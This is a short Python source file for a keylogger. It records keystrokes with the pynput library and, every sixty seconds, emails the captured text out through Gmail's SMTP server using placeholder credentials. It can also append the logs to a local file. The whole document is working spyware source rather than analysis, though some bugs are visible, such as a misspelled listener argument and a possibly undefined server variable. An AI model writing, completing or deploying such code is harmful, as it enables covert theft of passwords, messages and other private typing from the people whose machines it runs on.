from pynput import keyboard, mouse
import smtplib, time, threading

KEY = keyboard.Key

class Keylogger:
    def __init__(self):
        self.keylog = ''
        self.start()

    def start(self):
        self.report()
        with keyboard.Listener(on_pres=self.on_press) as listener:
            listener.join()

    def report(self):      
        if self.keylog != '':
            self.send_logs_email()
        self.clear_keylog()
        timer = threading.Timer(interval=60, function=self.start)
        timer.daemon = True
        timer.start()

    def get_keylog(self):
        return(self.keylog)

    def clear_keylog(self):
        self.keylog = ''
    
    def on_press(self, event):
        if event == KEY.backspace:
            self.keylog += " [Bck] "

        elif event == KEY.tab:
            self.keylog += " [Tab] "

        elif event == KEY.enter:
            self.keylog += '\n'

        elif event == KEY.space:
            self.keylog += " "

        else:
            self.keylog += str(event)[1:len(str(event)) - 1]

        return True

    def save_logs(self):
        with open('KeyLogs.txt', 'a') as logs:
            logs.write("-"*10 + f"{time.strftime('%d/%m/%Y')} {time.strftime('%I:%M:%S')})" + "-"*10 + '\n')
            logs.write(self.get_keylog())

    def send_logs_email(self, email='email@gmail.com', password='password'):
        email_content = f'Subject: New keylogger logs\n{self.keylog}'
        
        try:
            print('Sending...')
            smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            smtp_server.ehlo()
            smtp_server.login(email, password)
            smtp_server.sendmail(email, email, email_content)
            
            print('Email is sent.')
        
        except Exception as e:
            print(f'An error occurred: {e}')
        finally:
            smtp_server.close()
            print('Dissconnect from server')


if  __name__ == '__main__':
    logger = Keylogger()
    input()
